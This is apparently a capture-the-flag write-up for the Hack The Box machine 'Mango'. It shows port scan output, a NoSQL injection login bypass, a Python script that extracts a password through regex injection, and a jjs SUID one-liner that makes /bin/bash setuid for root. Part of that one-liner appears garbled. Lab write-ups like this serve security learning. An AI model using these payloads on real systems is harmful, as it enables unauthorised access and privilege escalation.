
Done with team BIT criminals
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Issuer: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-09-27T14:21:19
| Not valid after:  2020-09-26T14:21:19
| MD5:   b797 d14d 485f eac3 5cc6 2fed bb7a 2ce6
|_SHA-1: b329 9eca 2892 af1b 5895 053b f30e 861f 1c03 db95
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: Host: 10.10.10.162; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Add the subdomain name staging-order.mango.htb to /etc/hosts and it opens a login page.

# FOOTHOLD

```
username[$ne]=toto&password[$ne]=toto
```
Editing this payload via burpsuite redirects us to /home.php ( Found it while trying injections from Payload of All Things )
So wrote my super buggy script:

```py
import requests
import string

url="http://staging-order.mango.htb"

username="mango"
password=""

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload={
                     "username": username, 
                     "password[$regex]": "^"+password+c
                    
                    }
            r = requests.post(url, data = payload, allow_redirects = False)
            if r.status_code==302:
                print(f"N1ce:{password+c}")
                password += c

```
You want a better one, heres the link https://book.hacktricks.xyz/pentesting-web/nosql-injection

SSH to the box using user mango after bruteforcing its password and change username to admin using admin's password.

# PRIVILEGE ESCALATION

Finding SUID binaries:
```
/bin/fusermount
/bin/mount
/bin/umount
/bin/su
/bin/ping
/snap/core/7713/bin/mount
/snap/core/7713/bin/ping
/snap/core/7713/bin/ping6
/snap/core/7713/bin/su
/snap/core/7713/bin/umount
/snap/core/7713/usr/bin/chfn
/snap/core/7713/usr/bin/chsh
/snap/core/7713/usr/bin/gpasswd
/snap/core/7713/usr/bin/newgrp
/snap/core/7713/usr/bin/passwd
/snap/core/7713/usr/bin/sudo
/snap/core/7713/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/7713/usr/lib/openssh/ssh-keysign
/snap/core/7713/usr/lib/snapd/snap-confine
/snap/core/7713/usr/sbin/pppd
/snap/core/6350/bin/mount
/snap/core/6350/bin/ping
/snap/core/6350/bin/ping6
/snap/core/6350/bin/su
/snap/core/6350/bin/umount
/snap/core/6350/usr/bin/chfn
/snap/core/6350/usr/bin/chsh
/snap/core/6350/usr/bin/gpasswd
/snap/core/6350/usr/bin/newgrp
/snap/core/6350/usr/bin/passwd
/snap/core/6350/usr/bin/sudo
/snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/6350/usr/lib/openssh/ssh-keysign
/snap/core/6350/usr/lib/snapd/snap-confine
/snap/core/6350/usr/sbin/pppd
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/run-mailcap
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/at
/usr/bin/traceroute6.iputils
/usr/bin/pkexec
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
```

/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs    : This binary looks out of place.
Searching GTFOBins gives us an SUID exploit but for some reason it froze my terminal , so even though i got root i could not execute further commands :/

So we modify that exploit in order to get a working shell:

```java
echo "Java.type('java.lang.Runtime').getRuntime().exec('chmod +s /bin/bash |sh\${IFS}-p _ ech-p <$(tty) >$(tty) 2>$(tty)').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

And we execute the command:

```
bash -p
```